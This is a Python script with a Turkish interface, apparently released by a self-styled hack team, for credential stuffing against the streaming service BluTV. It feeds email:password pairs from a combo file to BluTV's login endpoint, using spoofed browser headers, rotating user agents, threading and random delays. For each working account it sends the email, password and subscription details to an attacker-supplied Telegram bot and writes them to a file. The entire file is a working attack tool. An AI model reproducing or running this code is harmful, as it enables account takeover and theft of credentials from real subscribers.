:l_B='success'
_A='error'
import requests,json,time,random,threading
from colorama import Fore,Style,init
init(autoreset=True)
USER_AGENTS=['Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv=91.0) Gecko/20100101 Firefox/91.0']
def show_banner():A=f"""
{Fore.BLUE}
   ▄████████  ▄█     █▄     ▄████████    ▄████████    ▄████████ 
  ███    ███ ███     ███   ███    ███   ███    ███   ███    ███ 
  ███    █▀  ███     ███   ███    ███   ███    ███   ███    █▀  
  ███        ███     ███   ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄     
▀███████████ ███     ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     
         ███ ███     ███   ███    ███ ▀███████████   ███    █▄  
   ▄█    ███ ███ ▄█▄ ███   ███    ███   ███    ███   ███    ███ 
 ▄████████▀   ▀███▀███▀    ███    █▀    ███    ███   ██████████ 
                                        ███    ███              
{Fore.RED}
Sware BluTV Checker - Tg > @swarehackteam & @leakturkeymalware
{Fore.YELLOW}
[+] Geliştirici: SPYIZXA
[+] Versiyon: 1.0
{Fore.RESET}
    """;print(A)
def log_to_file(message,log_type='info'):
	A='[INFO]';B={'info':Fore.CYAN+A,_B:Fore.GREEN+'[SUCCESS]',_A:Fore.RED+'[ERROR]','warning':Fore.YELLOW+'[WARNING]'};C=B.get(log_type,Fore.CYAN+A)
	with open('log.txt','a')as D:D.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {C} {message}\n")
def send_to_telegram(token,chat_id,message):
	B=message;D=f"https://api.telegram.org/bot{token}/sendMessage";E={'chat_id':chat_id,'text':B}
	try:
		A=requests.post(D,data=E)
		if A.status_code==200:print(Fore.GREEN+'[TELEGRAM] Mesaj başarıyla gönderildi.');log_to_file(f"Telegram mesajı gönderildi: {B}",_B)
		else:print(Fore.RED+f"[HATA] Mesaj gönderimi başarısız oldu. Hata: {A.status_code}");log_to_file(f"Telegram mesaj gönderimi başarısız: {A.status_code}",_A)
	except Exception as C:print(Fore.RED+f"[HATA] Telegram mesaj gönderimi sırasında bir hata oluştu: {C}");log_to_file(f"Telegram mesaj gönderimi hatası: {C}",_A)
def blutv_checker(username,password,token,chat_id):
	N='country';M='suspend_date';L='expire_date';K='start_date';J='first_name';I='price';G=False;F='tip';C=password;B=username;O='https://smarttv.blutv.com.tr/actions/account/login';P={'Host':'smarttv.blutv.com.tr','Content-Type':'application/x-www-form-urlencoded','deviceid':'Windows:Chrome:94.0.4606.71','deviceresolution':'1366x768','Origin':'https://www.blutv.com','sec-ch-ua':'Chromium;v=94, Google Chrome;v=94, ;Not A Brand;v=99','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'Windows','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','User-Agent':random.choice(USER_AGENTS)};Q={'username':B,'password':C,'platform':'com.blu.smarttv'}
	try:
		E=requests.post(O,headers=P,data=Q)
		if E.status_code==200:
			A=json.loads(E.text)
			if A.get('status')=='ok':
				D={I:A.get('Price'),F:A.get(F),J:A.get('FirstName'),K:A.get('StartDate'),L:A.get('ExpireDate'),M:A.get('SuspendDate'),N:A.get('Country')};R=f"""[Sware] BluTV Hesabınız ✅
🔗 Mail: {B}
🔗 Şifre: {C}
🔗 Price: {D[I]}
🔗 Tip: {D[F]}
🔗 Ad: {D[J]}
🔗 Başlangıç Tarihi: {D[K]}
🔗 Bitiş Tarihi: {D[L]}
🔗 Askıya Alma Tarihi: {D[M]}
🔗 Ülke: {D[N]}
""";print(Fore.GREEN+f"[TRUE] HİT ! Kullanıcı: {B} - Şifre: {C} ✅");send_to_telegram(token,chat_id,R);log_to_file(f"Başarılı giriş: {B} - {C}",_B)
				with open('success_accounts.txt','a')as S:S.write(f"{B}:{C}\n")
				return True
			else:print(Fore.RED+f"[FALSE] Giriş Başarısız: {B} - {C}");log_to_file(f"Başarısız giriş: {B} - {C}",_A);return G
		else:print(Fore.RED+f"[HATA] İstek hatası: {E.status_code}");log_to_file(f"İstek hatası: {E.status_code}",_A);return G
	except Exception as H:print(Fore.RED+f"[HATA] BluTV kontrolü sırasında bir hata oluştu: {H}");log_to_file(f"BluTV kontrol hatası: {H}",_A);return G
def combo_checker(combo_path,token,chat_id,thread_count=5):
	A=combo_path
	try:
		with open(A,'r')as F:G=F.readlines()
		H=[]
		for B in G:
			try:
				I,J=B.strip().split(':');C=threading.Thread(target=blutv_checker,args=(I,J,token,chat_id));H.append(C);C.start()
				while threading.active_count()>thread_count:time.sleep(.1)
				D=random.uniform(2,4);print(Fore.YELLOW+f"[INFO] {D:.2f} saniye bekleniyor...");time.sleep(D)
			except ValueError:print(Fore.RED+f"[HATA] Yanlış format: {B.strip()} (mail:pass şeklinde olmalı)");log_to_file(f"Yanlış format: {B.strip()}",_A)
	except FileNotFoundError:print(Fore.RED+f"[HATA] Dosya bulunamadı: {A}");log_to_file(f"Dosya bulunamadı: {A}",_A)
	except Exception as E:print(Fore.RED+f"[HATA] Combo dosyası işlenirken bir hata oluştu: {E}");log_to_file(f"Combo dosyası işlenirken hata: {E}",_A)
def main():show_banner();A=input(Fore.BLUE+'Telegram Bot Token: ');B=input(Fore.BLUE+'Telegram Chat ID: ');C=input(Fore.BLUE+'Combo Dosya Yolu: ');D=int(input(Fore.BLUE+'Thread Sayısı (varsayılan 5): ')or 5);print(Fore.CYAN+'[BAŞLATILIYOR] BluTV Combo Kontrolü...');combo_checker(C,A,B,D);print(Fore.CYAN+'[TAMAMLANDI] İşlem tamamlandı.')
if __name__=='__main__':main()